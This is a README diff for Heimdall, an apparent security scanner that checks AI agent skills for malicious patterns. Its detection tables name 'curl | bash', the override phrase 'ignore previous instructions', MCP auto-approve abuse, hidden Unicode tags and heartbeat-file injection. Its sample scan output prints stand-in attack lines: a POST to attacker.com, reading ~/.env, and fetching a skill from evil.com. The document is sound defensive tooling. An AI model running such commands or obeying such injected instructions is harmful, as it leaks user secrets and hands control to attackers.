@@ -2,108 +2,106 @@
 
 **The Watchman of Asgard - Security Scanner for AI Agent Skills**
 
-Heimdall scans OpenClaw/Clawdbot skills for malicious patterns before installation. Context-aware scanning reduces false positives by ~85% compared to naive pattern matching.
+Heimdall scans OpenClaw/Clawdbot skills for malicious patterns before installation. Context-aware scanning reduces false positives by ~85%.
 
-## Features
+## v3.0 Features (NEW)
 
-- 🔍 **60+ security patterns** across 10 categories
-- 🧠 **Context-aware** - distinguishes docs vs code vs strings
-- 🛡️ **Security tool detection** - auto-suppresses pattern examples in security tools
-- 📊 **Severity scoring** - SAFE → LOW → MEDIUM → HIGH → CRITICAL
-- 🎯 **Low false positives** - smart suppression for legitimate use cases
+From **HiveFence Scout**, **PromptArmor**, and **Simon Willison**:
+
+| Category | Description |
+|----------|-------------|
+| 🌐 Remote Fetch | Detects `curl skill.md` from internet |
+| 💓 Heartbeat Injection | Catches HEARTBEAT.md modifications |
+| 🔧 MCP Tool Abuse | Flags `no_human_approval`, `auto_approve` |
+| 🏷️ Unicode Tags | Hidden U+E0001-U+E007F characters |
+| ⚡ Auto-Approve | `always allow`, `curl \| bash` patterns |
+| 💰 Crypto Wallets | BTC/ETH address extraction |
+| 🎭 Impersonation | "ignore previous instructions" |
+| 📋 Pre-fill Exfil | Google Forms data exfiltration |
 
 ## Installation
 
 ```bash
-# Clone
 git clone https://github.com/henrino3/heimdall.git
 cd heimdall
-
-# Make executable
 chmod +x skill-scan.py
-
-# Optional: Add to PATH
 ln -s $(pwd)/skill-scan.py ~/.local/bin/skill-scan
 ```
 
 ## Usage
 
 ```bash
-# Basic scan
-./skill-scan.py <path-to-skill>
-
-# Examples
-./skill-scan.py ~/skills/some-skill/
-./skill-scan.py ./downloaded-skill/
-
-# Options
-./skill-scan.py --json <path>           # JSON output
-./skill-scan.py -v <path>               # Verbose - show all findings
-./skill-scan.py --strict <path>         # Ignore context, flag everything
-./skill-scan.py --show-suppressed <path> # Show suppressed findings
+skill-scan <path-to-skill>
+skill-scan --json <path>           # JSON output
+skill-scan -v <path>               # Verbose
+skill-scan --strict <path>         # Ignore context
+skill-scan --show-suppressed <path> # Show suppressed
 ```
 
-## Detection Categories
+## Detection Categories (100+ patterns)
 
-| Category | Description | Severity |
-|----------|-------------|----------|
-| `credential_access` | .env, secrets/, API keys, tokens | HIGH-CRITICAL |
-| `network_exfil` | curl/wget to external URLs, known exfil domains | HIGH-CRITICAL |
-| `shell_exec` | subprocess, os.system, eval, exec | HIGH-CRITICAL |
-| `filesystem` | Dangerous file operations, system files | MEDIUM-CRITICAL |
-| `obfuscation` | Base64 exec, encoded payloads | HIGH-CRITICAL |
-| `data_exfil` | Sending credentials externally | CRITICAL |
-| `privilege` | sudo, chmod 777, setuid | HIGH-CRITICAL |
-| `persistence` | crontab, bashrc injection | MEDIUM-HIGH |
-| `crypto` | Crypto miners, mining pools | CRITICAL |
+| Category | Severity | Examples |
+|----------|----------|----------|
+| `credential_access` | CRITICAL | .env, API keys, tokens |
+| `network_exfil` | CRITICAL | webhook.site, ngrok.io |
+| `shell_exec` | CRITICAL | subprocess, eval, exec |
+| `remote_fetch` | CRITICAL | curl skill.md from web |
+| `heartbeat_injection` | CRITICAL | Modifying HEARTBEAT.md |
+| `mcp_abuse` | CRITICAL | no_human_approval |
+| `unicode_injection` | CRITICAL | Hidden tag characters |
+| `auto_approve` | CRITICAL | curl \| bash |
+| `crypto_wallet` | HIGH | BTC/ETH addresses |
+| `impersonation` | HIGH | System prompt injection |
+| `prefill_exfil` | HIGH | Google Forms pre-fill |
+| `privilege` | HIGH | sudo -S, chmod 777 |
+| `persistence` | HIGH | crontab, bashrc |
+
+## Context-Aware Scanning
+
+Heimdall understands context to reduce false positives:
+
+| Context | Adjustment | Example |
+|---------|------------|---------|
+| `CODE` | Full severity | Executable scripts |
+| `CONFIG` | -1 level | YAML/JSON configs |
+| `DOCS` | -3 levels | README, CHANGELOG |
+| `STRING` | -3 levels | Pattern definitions |
+
+Security tools (Prompt Guard, etc.) are auto-detected and their pattern examples are suppressed.
 
 ## Example Output
 
 ```
 ============================================================
-🔍 SKILL SECURITY SCAN REPORT v2.0
+🔍 SKILL SECURITY SCAN REPORT v3.0
 ============================================================
-📁 Path: /home/user/skills/suspicious-skill
+📁 Path: /path/to/suspicious-skill
 📄 Files scanned: 5
-🔢 Active issues: 3
+🔢 Active issues: 14
 🔇 Suppressed (context-aware): 2
-⚡ Max severity: HIGH
-📋 Action: 🔴 HIGH - Do NOT install without audit
+⚡ Max severity: CRITICAL
+📋 Action: 🚨 CRITICAL - BLOCKED - Likely malicious
 ============================================================
 
-🚨 HIGH (2 issues):
-  [credential_access]
-    • scripts/main.py:45  - Reading .env file
-      Match: cat ~/.env
-  [network_exfil]
-    • scripts/main.py:52  - Curl to external URL
-      Match: curl -X POST https://attacker.com
-
-⚠️ MEDIUM (1 issues):
-  [shell_exec]
-    • scripts/helper.sh:12 [CONFIG] - Subprocess with list command
-      Match: subprocess.run([
-
-============================================================
-❌ RECOMMENDATION: Do NOT install this skill without thorough review
+🚨 CRITICAL (10 issues):
+  [remote_fetch]
+    • install.sh:3  - Fetching skill from internet
+      Match: curl https://evil.com/skill.md > ~/.moltbot/skills/
+  [heartbeat_injection]
+    • install.sh:4  - Appending to heartbeat file
+      Match: >> ~/.openclaw/HEARTBEAT.md
 ```
-
-## Context-Aware Scanning
-
-Heimdall understands context:
-
-| Context | Severity Adjustment | Example |
-|---------|---------------------|---------|
-| `CODE` | Full severity | Actual executable code |
-| `CONFIG` | -1 level | YAML/JSON config files |
-| `DOCS` | -3 levels | README, CHANGELOG, etc. |
-| `STRING` | -3 levels | Pattern in string literal |
-
-Security tools (like Prompt Guard) that contain attack patterns in their blocklists are automatically detected and suppressed.
 
 ## Why "Heimdall"?
 
-In Norse mythology, Heimdall is the watchman of the gods. He guards the Bifrost bridge, can see for hundreds of miles, and hears grass growing. Perfect for a security scanner that watches over your AI agent skills.
+In Norse mythology, Heimdall is the watchman of the gods. He guards the Bifrost bridge, can see for hundreds of miles, and hears grass growing. Perfect for watching over your AI agent skills.
+
+## Security Sources
+
+- [Simon Willison - Moltbook Security](https://simonwillison.net/2026/Jan/30/moltbook/)
+- [PromptArmor - MCP Tool Attacks](https://promptarmor.com)
+- [LLMSecurity.net - Auto-Approve Exploits](https://llmsecurity.net)
+- [opensourcemalware - Crypto-Stealing Skills](https://opensourcemalware.com)
 
 ## License
 
@@ -111,4 +109,7 @@ MIT
 
 ## Credits
 
-Built by the Enterprise Crew (Ada 🔮, Spock 🖖, Scotty 🔧)
+Built by the Enterprise Crew 🚀
+- Ada 🔮 (Brain + BD/Sales)
+- Spock 🖖 (Research & Ops)
+- Scotty 🔧 (Builder)
